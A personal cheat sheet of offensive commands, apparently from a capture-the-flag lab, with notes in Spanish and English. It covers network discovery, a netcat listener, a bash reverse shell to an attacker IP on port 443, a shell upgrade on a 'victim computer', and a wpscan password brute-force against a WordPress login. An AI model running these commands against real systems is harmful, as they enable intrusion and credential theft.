sudo arp-scan (ip) encuentra todos los dispositivos conectados en tu red!!!

![[arpscan.png]]

nc -nlvp 443 ( ponerse en escucha con netcat)

![[Cibersecurity/IMAGES/escuchanetcat.png]]

getcap -r / 2>/dev/null (conocer las capabilities o accesibilidades)

![[Cibersecurity/IMAGES/capabilitis.png]]

ls -la (muestra archivos ocultos)

![[backups.png]]


script /dev/null -c bash ( para ver mejor la consola al entrar en una computadora victima)
 
![[Cibersecurity/IMAGES/script-cbash.png]]

EL COMANDO PARA LA REVERSE SHELL (va con el ip propio) y sin la parte de arriba *#!/bin/bash* cuando creamos un servidor

#!/bin/bash

bash -i >& /dev/tcp/10.18.49.235/443 0>&1


# El uso de wget #

***wget http://192.168.100.28/key1-of-3.txt***
![[wget1key.png]]


# Reducir palabras repetidas # 

***unique -inp=fsocity.dic fsoc.txt***

In the archive fsocity.dic we see if there are repeated words with unique -inp=fsocity.dic

and then create a new archive caled fsoc.txt

# wpscan # 

![[wpscan.png]]

--url /select the url what we are going to attack
--output /create a report archive where put all the info *(SI NO ESPECIFICAMOS NADA, TE MUESTRA TODO EL PROCESO EN LA CONSOLA*
-P /select a dictionarie of passwords 
-U /select a dictionarie with users
-- max-threads /no se que hace
--password-attack /select the place where we are going to attack

wpscan --url http://192.168.100.28 --output wpscan-reportwp.txt -P fsoc.txt -U usuarios.txt --max-threads 20 --password-attack wp-login
![[wpscanattak.png]]


